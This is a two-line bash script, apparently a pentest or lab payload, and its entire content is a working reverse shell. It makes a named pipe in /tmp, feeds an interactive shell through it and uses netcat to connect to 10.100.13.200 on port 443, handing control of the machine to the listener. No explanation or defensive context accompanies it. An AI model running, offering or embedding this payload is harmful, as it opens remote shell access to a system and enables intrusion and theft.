#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.100.13.200 443 >/tmp/f
